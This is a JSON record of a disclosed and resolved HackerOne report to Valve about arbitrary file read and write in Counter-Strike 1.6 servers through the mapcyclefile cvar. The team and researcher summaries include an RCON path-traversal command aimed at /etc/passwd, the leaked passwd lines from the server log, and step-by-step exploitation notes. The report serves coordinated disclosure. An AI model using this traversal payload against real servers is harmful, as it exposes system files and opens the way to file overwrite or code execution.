{
  "id": 590279,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81OTAyNzk=",
  "url": "https://hackerone.com/reports/590279",
  "title": "[CS 1.6] Map cycle abuse allows arbitrary file read/write",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-05-25T23:25:25.082Z",
  "submitted_at": "2019-05-25T23:25:25.082Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fe7ch",
    "url": "/fe7ch",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23363,
    "url": "https://hackerone.com/valve",
    "handle": "valve",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Valve",
      "twitter_handle": "",
      "website": "https://www.valvesoftware.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-02-22T23:21:54.559Z",
  "bug_reporter_agreed_on_going_public_at": "2021-02-15T20:33:26.969Z",
  "team_member_agreed_on_going_public_at": "2021-02-22T23:21:54.375Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "750.0",
  "formatted_bounty": "$750",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 20,
  "voters": [
    "njbooher",
    "gamer7112",
    "mvc",
    "ali",
    "mikeisastar",
    "romesful",
    "fe7ch",
    "0nlymohammed",
    "brodie_codie",
    "demonia",
    "and 10 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 1289,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "hl.exe",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 26768,
      "category": "team",
      "content": "The CS 1.6 server has a feature of map cycle - i.e. automatic map change after specified period of time. This feature relies on data of the file specified in mapcyclefile cvar. \n\nAny user with RCON access to the server can set this variable to arbitrary value - no input sanitization applies. In order to turn it into arbitrary file read an attacker will need access to either HLDS console log or GameServerData001 interface (discussed later). To trigger vulnerability the attacker performs two steps:\n\n1. Sets mapcyclefile cvar via rcon\n2. Executes listmaps command in his game console\n\nHere are the logs from the HLDS console while exploiting this vulnerability:\n\n```\nRcon from 192.168.42.181:27005:\nrcon 1753030938 \"asd\" mapcyclefile ../../../../../etc/passwd\nSkipping root:x:0:0:root:/root:/bin/bash from mapcycle, not a valid map\nSkipping daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping bin:x:2:2:bin:/bin:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping sys:x:3:3:sys:/dev:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping sync:x:4:65534:sync:/bin:/bin/sync from mapcycle, not a valid map\nSkipping games:x:5:60:games:/usr/games:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping man:x:6:12:man:/var/cache/man:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping mail:x:8:8:mail:/var/mail:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping news:x:9:9:news:/var/spool/news:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping proxy:x:13:13:proxy:/bin:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping backup:x:34:34:backup:/var/backups:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping list:x:38:38:Mailing from mapcycle, not a valid map\nSkipping Manager:/var/list:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin from mapcycle, not a valid map\nSkipping gnats:x:41:41:Gnats from mapcycle, not a valid map\n```\n\nThings gets worse if GameServerData001 interface is used (exported by engine). This interface is used for remote server control (for example HLDS Windows GUI). A user who got access to this interface can archive arbitrary file read/write on the host system that could cause DoS or RCE.\n\nThe vulnerable function is `CServerRemoteAccess::SetValue`. It has the following code fragment:\n\n```\n  else if ( !strcasecmp(variable, \"mapcycle\") )\n  {\n    file = FS_Open(mapcyclefile.string, \"wt\");\n    if ( file\n      || (Con_Printf(\n            \"Couldn't write to read-only file %s, using file _dev_mapcycle.txt instead.\\n\",\n            mapcyclefile.string),\n          Cvar_DirectSet(&mapcyclefile, \"_temp_mapcycle.txt\"),\n          (file = FS_Open(mapcyclefile.string, \"wt\")) != 0) )\n    {\n      v4 = strlen(value);\n      FS_Write(value, v4 + 1, 1, file);\n      FS_Close(file);\n    }\n  }\n```\nSo it blindly opens file specified by mapcyclefile cvar and writes data to it. The steps will be:\n\n1. Set `mapcyclefile` cvar via rcon\n2. Execute `mapcycle` command with a payload through GameServerData001 interface\n\n## Impact\n\n- Arbitrary file read that leads to information disclosure\n- Arbitrary file write that leads to DoS or RCE depending on the target files",
      "user": {
        "id": 279011,
        "username": "mikela",
        "name": "Mike L",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-05-17T22:06:50.780Z",
        "url": "https://hackerone.com/mikela",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 44043,
      "category": "researcher",
      "content": "Game servers based on GoldSrc/Source engine have a feature of map cycle - i.e. automatic map change after specified period of time. This feature relies on data of the file specified in `mapcyclefile` cvar.\n\nAny user with RCON access to the server can set this variable to arbitrary value - no input sanitization applies. An attacker performs two steps to achieve arbitrary file read:\n1. Set `mapcyclefile` cvar via rcon\n2. Connect to the server. The mapcycle information is always included in `ServerInfo` packet that server sends to a new player.\n\nThings gets worse if `GameServerData001` interface is used (exported by engine). This interface is used for remote server control (for example HLDS Windows GUI). A user who got access to this interface can archive arbitrary file read/write on the host system that could cause DoS or RCE.\nThe vulnerable function is `CServerRemoteAccess::SetValue`. It has the following code fragment:\n```\n  else if ( !strcasecmp(variable, \"mapcycle\") )\n  {\n    file = FS_Open(mapcyclefile.string, \"wt\");\n    if ( file\n      || (Con_Printf(\n            \"Couldn't write to read-only file %s, using file _dev_mapcycle.txt instead.\\n\",\n            mapcyclefile.string),\n          Cvar_DirectSet(&mapcyclefile, \"_temp_mapcycle.txt\"),\n          (file = FS_Open(mapcyclefile.string, \"wt\")) != 0) )\n    {\n      v4 = strlen(value);\n      FS_Write(value, v4 + 1, 1, file);\n      FS_Close(file);\n    }\n  }\n```\nSo it blindly opens file specified by `mapcyclefile` cvar and writes data to it. The steps will be:\n1. Set `mapcyclefile` cvar via rcon\n2. Execute `mapcycle` command with a payload through GameServerData001 interface\n\nConfirmed affected games: Counter-Strike 1.6, Counter-Strike: Source",
      "user": {
        "id": 607893,
        "username": "fe7ch",
        "name": "fe7ch",
        "bio": "Malware analyst at daily job, bug hunter at spare time",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2019-05-09T10:54:35.955Z",
        "url": "https://hackerone.com/fe7ch",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
